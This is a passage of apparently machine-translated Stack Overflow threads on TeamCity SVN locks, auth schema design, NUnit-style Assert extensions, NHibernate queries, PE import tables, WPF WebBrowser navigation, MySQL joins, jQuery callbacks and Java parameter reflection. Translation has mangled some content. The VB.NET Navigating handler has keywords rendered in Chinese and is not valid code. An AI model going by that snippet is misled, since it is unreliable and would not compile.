-D:idea.build.agent.port=9092 -D:teamcity.build.checkoutDir=C:\Subversion\ProjectBuilds\0412 -D:teamcity.buildType.id=bt2 -D:teamcity.auth.userId=TeamCityBuildId=36 -D:teamcity.dotnet.nunitlauncher1.1=C:\BuildAgent\plugins\dotnetPlugin\bin\JetBrains.BuildServer.NUnitLauncher1.1.exe -D:user.variant= -D:teamcity.agent.cpuBenchmark=107 -D:teamcity.dotnet.nunitlauncher.msbuild.task=C:\BuildAgent\plugins\dotnetPlugin\bin\JetBrains.BuildServer.MSBuildLoggers.dll -D:user.home=C:\ -D:idea.build.server.build.id=36 -D:path.separator=; -D:teamcity.build.workingDir=C:\Subversion\ProjectBuilds -D:teamcity.build.properties.file=C:\BuildAgent\temp\agentTmp\teamcity.build31597.properties update NAnt 0.85 (Build 0.85.2478.0; release; 14/10/2006) Copyright (C) 2001-2006 Gerry Shaw http://nant.sourceforge.net Buildfile: file:///C:/Subversion/ProjectBuilds/BuildFiles/Update0412.build Target framework: Microsoft .NET Framework 1.1 Target(s) specified: update update: [svn-update] svn: Working copy '.' locked [svn-update] svn: run 'svn cleanup' to remove locks (type 'svn help cleanup' for details) BUILD FAILED - 0 non-fatal error(s), 2 warning(s) C:\Subversion\ProjectBuilds\BuildFiles\Update0412.build(9,10): External Program Failed: C:\Program Files\CollabNet Subversion\svn.exe (return code was 1) Total time: 0.4 seconds.
[16:01:56]: Process exit code: 1 
```

编辑：问题确实与 SVN 结帐处于状态有关。我通过允许 TeamCity 进行自己的结帐来修复它（同时我可能也进行了清理）。看起来 James Gregory 和 Ruben Bartelink 都是正确的！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-23T09:28:45.617

TeamCity 在运行构建的代理中拥有自己的结帐位置。错误消息指出该工作副本以某种方式变得混乱；如果构建失败并且正在更新中，有时会发生这种情况。我建议尝试`svn cleanup`在特定代理的工作副本中做一个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T09:35:19.800

此外，如果您转到项目页面并从操作菜单中选择“强制执行干净签出”（或在项目设置中永久强制它），它可能会让您克服这个问题（即，强制它获得一个干净的副本而不是正常的 [更快] 获取增量的方法）。

您还可以清除工作目录，看看是否可以治愈它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-27T21:36:59.757

TeamCity 支持代理上的 svn checkout。它能够在 build checkout 目录中自动调用 svn update。请在 build configuration settings/2.Version Control 下选择 checkout on agent。

请查看 [http://www.jetbrains.net/confluence/display/TCD4/Build+Checkout+Directory的文档页面](http://www.jetbrains.net/confluence/display/TCD4/Build+Checkout+Directory)

# authentication - 身份验证/授权架构

> ID：381453
> 
> 赞同：2
> 
> 时间：2008-12-19T16:28:46.597
> 
> 标签：authentication, model, authorization, schema, data-modeling

是否有任何用于身份验证/授权模式的最佳实践数据模型？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-19T16:50:40.763

由角色到权限的映射组成的数据模型相当灵活，适合大多数用途。

然后你将角色分配给用户（这个概念与组的概念本质上相同）......一个用户可能拥有多个角色，并且他们的角色定义了他们拥有的权限。

在代码中，您（通过他们的角色）检查用户是否拥有执行功能所需的权限。

身份验证是分开的，这只是验证用户是谁，而不是他们可以做什么。通常你应该保持这种分离（尽管有些方案被设计成只关心用户可以做什么，而不关心他们是谁）。

在您的设计中，您可以将访问控制系统可视化为一个矩阵（角色到权限）。

我还将扩展“不存储密码”的答案——根本不要设计自己的身份验证方案。你可能会弄错。重复使用经过验证的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T16:38:56.093

最重要的是

**不要存储密码**

存储密码摘要。请参阅[RFC 2069](https://www.rfc-editor.org/rfc/rfc2069)和此[Wikipedia 文章](http://en.wikipedia.org/wiki/Digest_access_authentication)。当有人尝试进行身份验证时，您将他们输入的摘要与您必须查看他们的凭据是否匹配的摘要进行比较。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T17:08:23.863

我将在 S.Lott 对“不存储密码：存储密码摘要”的回答中添加一个警告：

如果您真的想防止攻击，请确保在摘要中使用[盐](http://en.wikipedia.org/wiki/Salt_(cryptography))；如果它是像 MD5 这样的著名算法，并且有人可以掌握哈希输出，那么他们可以在自己的 CPU 时间上快速检查可能的密码，如果他们找到匹配项，那么他们就获得了密码。添加盐可以防止这种攻击（参见[维基百科文章](http://en.wikipedia.org/wiki/Salt_(cryptography))）。

您可以尝试查看[OpenID](http://openid.net/)，因为它是处理身份验证的一种相当简单的方法。知名站点（OpenID[提供者](http://openid.net/get/)）为您处理身份验证，并以密码方式断言具有身份 X 的人已正确进行身份验证。然后你只需要处理授权哪些身份 X 被允许做什么。您始终可以限制您信任的身份提供者（例如，您可能信任 Yahoo、AOL 和 Blogger，但不信任某些随机站点，因为从技术上讲，任何人都可以托管自己的身份提供者服务器）。

# c# - 你是如何扩展你的 Assert 类的

> ID：381455
> 
> 赞同：13
> 
> 时间：2008-12-19T16:29:03.507
> 
> 标签：c#, unit-testing, tdd, assertions

我喜欢将我的 Assert.AreEqual 扩展到许多不同的类，已知的当然是 CollectionAssert，但我可以想到更多，例如：[ImageAssert](http://www.human-debugger.net/blog/2008/12/21/TddExtendingAssertToSupportImages.aspx)、 XmlAssert 等。

您是否创建了自己的 Assert 类？你想创造什么样的新事物？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-03T11:53:44.007

这就是我的解决方案：

```
using MyStuff;

using A = Microsoft.VisualStudio.TestTools.UnitTesting.Assert;

namespace Mytestproj.Tests
{
    public static class Assert
    {
        public static void AreEqual(object expected, object actual)
        {
            A.AreEqual(expected, actual);
        }

        // my extension
        public static void AreEqual(MyEnum expected, int actual)
        {
            A.AreEqual((int)expected, actual);
        }

        public static void IsTrue(bool o)
        {
            A.IsTrue(o);
        }

        public static void IsFalse(bool o)
        {
            A.IsFalse(o);
        }

        public static void AreNotEqual(object notExpected, object actual)
        {
            A.AreNotEqual(notExpected, actual);
        }

        public static void IsNotNull(object o)
        {
            A.IsNotNull(o);
        }

        public static void IsNull(object o)
        {
            A.IsNull(o);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-19T16:48:11.770

我喜欢 Assert 类的感觉，但想要更多用作通用验证框架的东西。我从 Roger Alsing 关于使用扩展方法的[文章](http://rogeralsing.com/2008/05/10/followup-how-to-validate-a-methods-arguments/)开始，现在有一个系统，其工作方式如下：

```
Enforce.That(variable).IsNotNull();
Enforce.That(variable).IsInRange(10, 20);
Enforce.That(variable).IsTypeOf(typeof(System.String));
etc. 
```

如果任何强制执行失败，则会引发异常。我一直在考虑重构，以便我还可以合并一个不会引发异常的非关键评估。有些人喜欢 Check.That 作为 Enforce.That 的变体，它将返回布尔值，但具有具有相同签名的扩展方法。

到目前为止，我喜欢这种方法的地方在于，我可以在我的单元测试中使用它们，以及在我的实际代码中使用它们来解决验证前和验证后的问题，而无需引用 Microsoft.VisualStudio.QualityTools.UnitTestFramework 程序集。我将它放在我的应用程序框架的根程序集中，而 Enforce 位于根目录，因此很容易获得。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T16:46:04.643

我的许多测试都围绕着加载一个具有已知良好状态的对象（如切割路径）。执行测试，然后将结果与加载的对象进行比较。如果它们不同，那么“发生”某些事情会导致代码发生变化。

这种方法可以节省大量时间，并允许在需要时进行自定义比较。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-20T06:42:52.800

我认为，如果您重构测试以减少重复，那么您最终会创建自己的框架作为副产品，当然您的测试框架将拥有在您的上下文中有意义的断言助手。

我想到的一个例子是，在测试 xhtml 报告时，我们最终得到的测试看起来像：

```
 assertCoverageEquals(45.5); 
```

断言覆盖的背后是这样的：

```
 assertPercentage(COVERAGE_ID, 45.5); 
```

然后后面是使用 xpath 获取值的方法和另一种知道百分比格式的方法。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-21T23:01:48.363

正如我在上面写的那样（在我的问题中），我刚刚向[ImageAssert](https://web.archive.org/web/20131031051646/http://human-debugger.net/wp-blog/2008/12/21/tdd-extending-assert-to-support-images/)添加了一个实现，我很高兴听到更多此类示例

```
[TestMethod]
public void CompareImagesSize()
{
 Image expected = Bitmap.FromFile(@"C:\ShaniData\Projects2008\TddSamples\Output\ExpectedImage.png");
 Image actual = Bitmap.FromFile(@"C:\ShaniData\Projects2008\TddSamples\Output\RhinoDiagram.png");

 Bitmap expectedBitmap = new Bitmap(expected);
 Bitmap actualBitmap = new Bitmap(actual);

 ImageAssert.HasTheSameSize(expectedBitmap, actualBitmap);
}

[TestMethod]
public void CompareTwoSameImagesButWithDifferenExtension()
{
 Image expected = Bitmap.FromFile(@"C:\ShaniData\Projects2008\TddSamples\Output\Image2.png");
 Image actual = Bitmap.FromFile(@"C:\ShaniData\Projects2008\TddSamples\Output\Image1.jpg");

 Bitmap expectedBitmap = new Bitmap(expected);
 Bitmap actualBitmap = new Bitmap(actual);

 ImageAssert.AreEqual(expectedBitmap, actualBitmap);
}

public class ImageAssert
{
    //public static void MoreMethods(Bitmap expected, Bitmap actual)
    //{
    //    //Compare image extensions
    //    //Compare Thumbnail...
    //}

    public static void HasTheSameSize(Bitmap expected, Bitmap actual)
    {
        if ((expected.Height != actual.Height)
            || (expected.Width != actual.Width))
            HandleFail("ImageAssert.HasTheSameSize", String.Empty);
    }

    public static void AreEqual(Bitmap expected, Bitmap actual)
    {
        for (int i = 0; i < expected.Width; i++)
        {
            for (int j = 0; j < expected.Height; j++)
            {
                Color expectedBit = expected.GetPixel(i, j);
                Color actualBit = actual.GetPixel(i, j);
                if (!expectedBit.Equals(actualBit))
                {
                    HandleFail("ImageAssert.AreEqual", String.Empty, i, j);
                    return;
                }
            }
        }
    }

    internal static void HandleFail(string assertionName, string message, params object[] parameters)
    {
        throw new AssertFailedException(String.Format(assertionName));
    }
} 
```

# ms-access - TFS 构建中的 MS Access 项目

> ID：381466
> 
> 赞同：1
> 
> 时间：2008-12-19T16:35:06.710
> 
> 标签：ms-access, tfsbuild

我有一个问题要问大家，欢迎提出任何想法。我们的存储库中有很多 MSAccess 数据库项目，开发人员在这些项目上工作并在 Dev Envoirment 中自己进行测试。众所周知，编译数据库项目本身就是一个错误的说法，因为您实际上需要测试您的脚本和报告以及针对数据库的所有其他内容。所以在 MSAccess 项目的情况下，我们可以在 TFS 构建脚本中做什么，我没有想法。任何遇到过这个问题并对此做了一些事情的人，如果你分享，我真的很感激。

任何可以解释如何进行的示例或链接都会更好。请理解它是一个 MS Access 项目。

谢谢鲍勃

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-19T17:23:16.190

编译并不是完全错误的说法。

在 VBA 方面，Debug 菜单下有一个名为 Compile 的选项（我不相信它真的像 C 语言那样编译，但它正在预解析您的代码等）。这与在 GUI 端构建 MDE 相结合等同于编译。

通常，在使用 VBA 时，我会经常运行编译以确保一切在语法上都是正确的，等等。

就测试而言，一旦你知道它可以编译，你还没有完成。如果可以编译仍然是错误的。这就是您需要自动化测试脚本的原因。我会考虑 MDB 中的一个小脚本/表单，您可以手动运行它来打开和关闭所有关注的报告并练习代码。实际的表单功能自动化起来会更棘手，但也可以完成。

# visual-studio - 外部程序集应该放在我的 Visual Studio 解决方案中的什么位置，以便它们成为源代码控制的一部分？

> ID：381478
> 
> 赞同：3
> 
> 时间：2008-12-19T16:39:54.827
> 
> 标签：visual-studio, version-control, visual-studio-2005

我有一个多项目解决方案。我相信将所有**外部**引用的程序集（例如 OSS 的东西）放在解决方案及其组件项目的相对路径上的文件夹中是最佳实践。

我想在包含我的 .sln 文件的同一个 Windows 文件夹中创建一个名为**Libs的真实文件夹，并将其添加到源代码控制（团队系统）。**我似乎无法从解决方案资源管理器中弄清楚如何做到这一点。我只能从源代码管理资源管理器中执行此操作。似乎没有办法将此 Libs Windows 文件夹直接添加到解决方案本身。

我看到您可以创建一个“解决方案文件夹”——但这并不对应于真正的 Windows 文件夹，它显然将文件放在顶级解决方案文件夹中。

我想知道是否有办法将 Libs 文件夹添加到解决方案中，以便它明显存在并被组件项目引用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T16:42:49.703

这是我在 TFS 中的结构

```
Development/
   Trunk/
      Binaries/  -- Shared libraries
      Source/
      Test/      
      Docs/      -- Documentation
      TeamBuildTypes/  -- Build definitions 
```

您不能直接在 Visual Studio 中使用这些项目做您想做的事情。您可以做的最好的事情是创建一个外部文件夹，在其中添加库，然后添加解决方案文件夹和“添加现有项目”，然后选择库并单击“添加为链接”。它实际上隐藏在“添加”按钮的下拉列表中。单击小箭头，它将为您提供“添加为链接”选项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-23T13:59:06.537

我通常看到第三方 DLL 放置在源代码管理中任何特定项目之外的“第三方”文件夹中。然后在您的项目中从“第三方”文件夹中引用它，并确保将引用的 Copy Local 属性设置为 true。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-16T16:21:47.717

"Thanks Micah. The Add As Link option I think is new with VS2008\. Alas, this is a VS2005 project and I don't see it. "

You can't use "Add as Link" within solution folders anyway.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-02T08:39:37.627

看看[Streamed Lines 论文](http://www.cmcrossroads.com/bradapp/acme/branching/)，它提出了一些处理第三方依赖关系的结构模式

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-12-23T14:01:55.533

值得一提的是，我们在解决方案之外有一个“PrecompiledLibraries”文件夹（Micah 称之为 Binaries），我们在那里引用。如果新的外部库发生变化，我们只需将其放入、重新链接、测试和重新编译。如果一切正常，请提交并瞧。

# python - Psyco x64?

> ID：381479
> 
> 赞同：3
> 
> 时间：2008-12-19T16:40:38.850
> 
> 标签：python, psyco

Is there a way to get the same sort of speedup on x64 architecture as you can get from psyco on 32 bit processors?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T17:28:33.573

No, unfortunately, Psyco [only runs on 32-bit x86 right now](http://psyco.sourceforge.net/introduction.html).

# ruby - Ruby (Shoes) - 等待函数返回值

> ID：381480
> 
> 赞同：2
> 
> 时间：2008-12-19T16:40:50.940
> 
> 标签：ruby, function, shoes

我有一个向用户展示组合框的功能。

```
def select_interface(interfaces)
  list_box :items => interfaces do |list|
    interface = list.text
  end
  ### ideally should wait until interface has a value then: ###
  return interface
end 
```

程序的其余部分取决于此组合框中的选择。

我想找到一种方法让 ruby​​ 等待来自组合框的输入，然后执行其余代码。

[鞋子](http://shoooes.net)里有一个类似的函数叫做**[ask](http://help.shoooes.net/Built-in.html#ask)**会等待用户的输入。

```
interface =  ask("write your interface here") 
```

如何在 Ruby/shoes 中实现这个“等到变量有值”功能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-21T21:21:38.423

我花了一段时间才理解你的问题:) 我开始写一个关于 GUI 应用程序整个理论的长答案。但是你已经拥有了你需要的一切。[list_box](http://help.shoooes.net/ListBox.html)占用的块实际上是它的更改方法。你告诉它当它改变时该怎么做。当您获得所需的值时，只需推迟程序的其余部分即可运行。

```
Shoes.app do 
  interfaces = ["blah", "blah1", "blah2"]
  # proc is also called lambda
  @run_rest_of_application = proc do
    if @interface == "blah"
      do_blah
    # etc
  end

  @list_box = list_box(:items => interfaces) do |list|
    @interface = list.text
    @run_rest_of_application.call
    @list_box.hide # Maybe you only wanted this one time?
  end
end 
```

这是所有 GUI 应用程序背后的基本思想：构建初始应用程序，然后等待“事件”，这将为您创建新的状态来响应。例如，在 ruby​​-gnome2 中，您将使用带有[Gtk::ComboBox](http://ruby-gnome2.sourceforge.jp/hiki.cgi?Gtk%3A%3AComboBox)的回调函数/块来更改应用程序的状态。像这样的东西：

```
# Let's say you're in a method in a class
@interface = nil
@combobox.signal_connect("changed") do |widget| 
  @interface = widget.selection.selected
  rebuild_using_interface
end 
```

[即使在工具包之外，您也可以使用 Ruby 的Observer 模块](http://www.ruby-doc.org/stdlib/libdoc/observer/rdoc/index.html)获得“免费”事件系统。希望这有帮助。

# c# - NHibernate 效率

> ID：381485
> 
> 赞同：6
> 
> 时间：2008-12-19T16:43:26.333
> 
> 标签：c#, performance, nhibernate

在 ORM 和现代数据访问的世界中落后了，我希望从 DataSets ( *shudder* ) 转移到一个适当的映射框架中。

我刚刚开始了解 Linq to SQL，我现在正在研究 NHibernate，以便在我们的下一个项目中使用它。

使用老式 sql 和数据集，您的 sql 查询显然只返回您想要的数据。我也知道 L2S 也很聪明，可以评估其 where 子句，以便它只返回您请求的对象。NHibernate 是一样的吗？Ayende 的 Linq to NHibernate 也一样吗？

我的意思是，如果我做相当于：

```
Select * from customers where name = "fred" 
```

它会将每个客户都提取到内存中，然后过滤掉非 freds，还是它足够聪明，只得到它需要的东西？

如果它是智能的，有什么注意事项？是否存在无法以这种方式评估的某些类型的查询？我需要注意哪些性能问题？

谢谢

安德鲁

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-19T16:48:49.800

一个快速的答案是 ORM 将检查属性名称并将其转换为 SQL 查询，该查询将为您命名 = ...。因此它不会将所有客户加载到内存中以搜索名称。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-19T16:51:40.497

Nhibernate 提供了几种不同的方式来查询数据库。Hibernate 使用称为 HQL 的类似 Sql 的语法，它是对象上的 SQL。它还可以通过示例进行搜索，在其中创建对象并填写所需的条件，然后休眠将对象从具有相同属性值的数据库中拉出。

看看这里，它会让你快速[了解 Nhibernate 的夏天](http://www.summerofnhibernate.com/)第 2 课和 2a 会更深入地回答

高温高压

骨头

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-19T18:58:57.980

如果您真的担心 NHibernate 正在生成什么查询，请运行 SQL Server Profiler 并找出正在运行的内容或配置它的日志记录并打开其 SQL 输出。它将显示您配置其 log4net 的所有 SQL 语句。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T17:36:02.483

是的，NHibernate 应该是目前性能最高的 ORM 之一，我曾在一个项目中使用过，它非常酷。关于 LINQ to NHibernate[您可能想查看这篇文章](https://web.archive.org/web/20090215004055/http://blogs.hibernatingrhinos.com/nhibernate/archive/2008/11/26/linq-to-nhibernate.aspx)。有一个学习曲线（NHQL 和 ICriteria），如果你想跳起来一开始会很困难，但所有投入的时间都会回到你身上。希望这可以帮助。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-20T04:02:09.317

无论您使用 HQL 还是 ICriteria，NHibernate 都会为您的示例创建一个类似的查询，但它实际上会更好。它将创建一个参数化的 sql 语句，以便查询可以缓存在 SQL Server 中。

ICriteria 非常灵活，但是要精通它需要一点学习曲线。我也推荐夏天的 nhibernate 截屏视频，以便快速上手。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-22T03:25:40.233

使用 NHibernate 实现“企业级”性能有点简单。

基于对象中的属性和关系映射，ORM 将为该获取构建一个特定的查询。如果一个属性被标记为延迟加载，那么它将被排除在外，并且当在会话中访问该属性时，后续的提取将只获得那部分丢失的数据。所以如果我们打开 SQL 分析器，翻译后的查询会像这样

```
Select cust.Address, cust.Email from customers cust where cust.Name = "fred" 
```

同样重要的是查询的深度。[我们可以通过使用HQL](http://www.hibernate.org/hib_docs/reference/en/html/queryhql.html)查询来限制返回的记录数量（对于大型数据集很重要），这些查询根据您的数据库提供程序对数据进行分页……只要它们与 HQL 解析器一起使用。您还可以在将执行连接以在单个交互中从多个表中进行选择的关系映射上设置`FetchMode`or 。`CollectionFetchMode`

如果您使用的是 SQL 服务器，您可以打开[sp_execsql](http://geekswithblogs.net/billy/archive/2006/03/08/71736.aspx)，它将通过存储的 proc 运行所有提取以快速提高性能。

[有关更多信息，请参阅Code Project](http://www.codeproject.com/KB/database/NHibernate_Perf2.aspx)上的一篇很棒的文章，其中详细介绍了如何在您的应用程序中提高 NHibernate 的性能。如果您使用的是面向服务的架构，延迟可能是一个大问题。查看[此线程](https://stackoverflow.com/questions/379897/traversing-object-graph-from-n-tier-client)以获取有关此内容的一些详细信息。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-10-16T14:21:02.403

对于 Linq to Entities，Linq to SQL 开发已被删除。你也应该试一试。

# memory - 在哪里可以找到表示内存中 dll 的数据结构的规范？

> ID：381487
> 
> 赞同：1
> 
> 时间：2008-12-19T16:44:10.480
> 
> 标签：memory, dll, structure

具体来说，我想知道导入（idata）部分的数据结构是什么样的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-20T04:02:17.697

DLL文件格式和EXE文件一样，都是PE（portable executable）格式。您可以从 Microsoft获取[规范的副本。](http://www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx)您还可以尝试[Wotsit](http://www.wotsit.org/)获取一般文件格式信息。

Windows 提供了用于处理可执行文件的[ImageHlp API。](http://msdn.microsoft.com/en-us/library/ms680181.aspx)该[`LoadImage`](http://msdn.microsoft.com/en-us/library/ms680209.aspx)函数看起来是一个很好的起点。

您还应该查看*Undocumented Windows NT*的[“可移植可执行文件格式”一章](http://www.windowsitlibrary.com/Content/356/11/1.html)。它似乎描述了如何使用 ImageHlp 来获取二进制文件的各个部分。我认为您最感兴趣的部分在第四页，它描述了 PE 文件的部分。*`IMAGE_DIRECTORY_ENTRY_IMPORT`*

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-22T14:37:51.297

看来我弄错了——PE文件的结构在内存中似乎是相同的。

可以使用[winnt.h](http://doc.ddart.net/msdn/header/include/winnt.h.html)中定义的结构来解释内存。

查看这些结构时，您必须记住偏移量（或 'RVA's[1]）是*little endian*。如果我只是将程序指向相关内存而不是使用调试器，我可能不会感到困惑。

[1] 在微软讲话中。

# .net - 如何将 WPF WebBrowser 设为只读？

> ID：381492
> 
> 赞同：3
> 
> 时间：2008-12-19T16:46:41.863
> 
> 标签：.net, wpf

我正在使用 WPF WebBrowser 控件来预览用户键入的 HTML。

例子...

[WPF TextBox 和 WebBrowser 控件 http://img411.imageshack.us/img411/2296/appbz9.jpg](http://img411.imageshack.us/img411/2296/appbz9.jpg)

但是，如何将 WebBrowser 控件设为只读？我不希望用户点击那里的链接并离开预览页面。

我希望我的用户创建链接。我只想确保“预览”窗格是正确页面的预览。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-19T20:09:19.443

捕获 WebBrowser 控件的 Navigating 事件并将其 NavigatingCancelEventArgs 的 Cancel 属性设置为 True。

Visual Basic 代码...

```
Private Sub WebBrowser1_Navigating(...) 处理 WebBrowser1.Navigating
    如果 WebBrowser1Locked 然后
        e.取消=真
    万一
结束子

```

这需要一个全局锁定布尔变量。

```
部分公开课窗口1
    Dim WebBrowser1Locked As Boolean = True
    ...
结束类

```

并锁定和解锁以包裹*所需*的导航。

```
WebBrowser1Locked = False
WebBrowser1.NavigateToString("...")
WebBrowser1Locked = True

```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-12-19T16:52:05.473

您不能在整个控件上放置一个[透明窗口并在那里捕获所有鼠标和键盘事件吗？](http://blogs.interknowlogy.com/johnbowen/archive/2007/06/20/20458.aspx)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-19T16:53:16.907

也许您可以在控件尝试导航到链接之前捕获控件的单击事件并将其丢弃？我不确定这是否可能，但我会尝试。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T16:50:37.130

您将不得不清理输入。

不允许锚点或脚本标签或属性。（我不知道您是否可以在控件上禁用 javascript，但这将是一个好主意。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-07-08T19:59:46.373

有没有人尝试过 WebBrowserControl.AllowNavigation = False 我认为这可以。您可以在运行时根据需要启用和禁用该属性。我使用 Timer 来禁用具有自定义延迟的属性，以便文档有时间加载。

祝你好运，丹

# mysql - MySQL内部连接问题

> ID：381496
> 
> 赞同：0
> 
> 时间：2008-12-19T16:48:00.537
> 
> 标签：mysql

我在 MySQL 数据库中有两个表

具有列 id 和 urlclicked 的 urltracker 和具有列 id、url_id 和 urlreferrer 的 urlreferrer

urltracker 实际上只是一个查找表，其中 urlreferrer 表中的 url_id 列是表之间的链接。

**示例 DDL：**

```
CREATE TABLE urltracker (
  id           SERIAL PRIMARY KEY,
  urlclicked   VARCHAR(200) NOT NULL
);

CREATE TABLE urlreferrer (
  id           SERIAL PRIMARY KEY,
  url_id       BIGINT UNSIGNED NOT NULL,
  urlreferrer  VARCHAR(200) NOT NULL
  FOREIGN KEY(url_id) REFERENCES urltracker(id)
); 
```

我想做的是以这样一种方式加入这两个表，这样我就可以通过查找 urlclicked 表和来自 urlreferrer 表的针对此特定 url 的引荐来源网址总数来获取点击的 url。

我已经搞砸了 2 个小时，但我无处可去，我没有数据库专家，任何人都可以解释如何实现这一点。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T16:57:16.197

如果您希望所有网址都使用它，

```
 Select urlClicked, Count(*)
   From urlReferrer R 
       Join urlTracker U
           On U.id = R.urlId
   Group By urlClicked 
```

如果您只希望它用于指定的初始点击，

```
 Select urlClicked, Count(othRef.id)
 From urlReferrer R 
       Join (urlTracker U Join urlReferrer othRef
                  On othRef.urlId = U.urlId)
           On U.id = R.urlId
 Where R.id = [Specified Referrer's Id]
 Group By urlClicked 
```

-- 编辑以更正 Where 子句的顺序

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T16:57:32.483

我认为 ：

```
SELECT ut.urlclicked, COUNT(ur.id) 
FROM urltracker ut JOIN urlreferrer ur ON (ut.id = ur.url_id) 
GROUP BY ut.urlclicked 
```

应该这样做。

# javascript - 回调和范围

> ID：381501
> 
> 赞同：0
> 
> 时间：2008-12-19T16:49:59.470
> 
> 标签：javascript, jquery

在尝试学习 Jquery 时，我发现在完全理解回调作用域方面存在一些问题。我要补充一点，我对 Javascript 语言的经验很少代码：

```
var globDom;    // placeholder for DOM fragment

// Getting xml file; jquery parses the file and give me back a DOM fragment
// saveXML is the callback

$.get(requestTarget, {}, saveXML);

// the globDom here is UNDEFINED !

alert(globDom);

// the callback

function saveXML(xmlDom)
{
    globDom = xmlDom;
} 
```

我敢肯定，我在这里有一个很大的误解...

有什么建议吗？

谢谢

丹尼尔

* * *

啊啊。非常清楚，我完全理解我的假设中的错误：我忘记考虑数据访问时间（以前！）和内容可用时间之间的时间滞后。一个非常严重的缺陷 - 批量编程有偏见:-(问题很清楚，我现在可以正确解决它。非常非常感谢您的回复！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-19T17:04:43.247

我自己没有使用过 jquery，但我的理解是它所做的很多事情都是异步的。该 get 方法可能不会立即调用您的回调。您需要等到回调运行后才能尝试访问 globDom。

尝试在回调方法中添加警报。那是在 get() 之后发出警报之前还是之后发生的？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-19T17:23:33.180

基本上，您需要将任何与返回数据一起使用的代码放在回调本身或从回调调用的函数中，因为在此之前数据不存在。

例如：

```
// Getting xml file; jquery parses the file and give me back a DOM fragment
// saveXML is the callback

$.get(requestTarget, {}, saveXML);

// the callback

function saveXML(xmlDom)
{
    // the xmlDom here is DEFINED !

    alert(xmlDom);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T17:11:34.780

我认为你的范围很好。saveXML 创建一个**闭包**，其中包括范围内的 globDom。如果您不熟悉该术语，则闭包意味着*定义*函数的范围包含在该函数主体的范围内。这意味着因为 globDom 在定义 saveXML 的范围内，所以 saveXML 的主体可以访问与在其上方定义的警报相同的 globDom 实例。

我认为您的实际问题在于 $.get 不是同步的。$.get 在获取完成之前立即返回，这意味着在回调运行之前调用了警报。相反，您可以使用 $.ajax，并将“async”选项设置为 false，这将使 $.ajax 调用在服务器请求成功之前不会返回。

但是，最好的解决方案是让您的代码异步，这样您就可以将控制权交还给浏览器，这样用户在等待服务器请求完成时仍然可以与页面交互。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T17:12:47.537

赫尔姆斯所说的。你的（简化的）时间线看起来像

```
0.001 globdom = undefined;
0.002 $.get(somerequest, callback)
0.003 alert(globdom)

.. 50 milliseconds later ..

0.053 saveXml(xmlDom) 
```

# java - 有没有办法在 Java 中获取方法参数的名称？

> ID：381502
> 
> 赞同：17
> 
> 时间：2008-12-19T16:50:24.400
> 
> 标签：java, reflection

我正在编写小型且非常[DRY](http://en.wikipedia.org/wiki/DRY)的框架，该框架严重依赖元数据。我想知道是否有办法获取方法参数名称，即给定一些方法

```
public void a(int myIntParam, String theString) { ... } 
```

得到字符串`"myIntParam"`和`"theString"`.

我知道我可以注释参数，但这不会很好......

```
public void a(
    @Param("myIntParam") int myIntParam,
    @Param("theString") String theString
) { ... } 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2008-12-21T20:50:27.223

这是一个肮脏的解决方案，需要一些调整。也许有人可以让它变得更好。

### 缺点：

*   要求您知道已编译类文件的位置。
*   它必须使用 -g 标志进行编译。

### 代码：

```
import com.sun.org.apache.bcel.internal.classfile.ClassParser;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.LocalVariable;
import com.sun.org.apache.bcel.internal.classfile.Method;
import java.io.IOException;

public class Main {

  public static void main(String[] args) throws IOException {
      ClassParser parser = new ClassParser("Main.class");
      JavaClass clazz = parser.parse();

      for (Method m : clazz.getMethods()) {
          System.out.println("Method: " + m.getName());
          int size = m.getArgumentTypes().length;
          if (!m.isStatic()) {
            size++;
          }

          for (int i = 0; i < size; i++) {
              LocalVariable variable = m.getLocalVariableTable().getLocalVariable(i);
              System.out.println("  - Param: " + variable.getName());
          }
      }
  }

  public void a(int myIntParam, String theString) {
  }
} 
```

### 输出：

`$ javac -g Main.java`
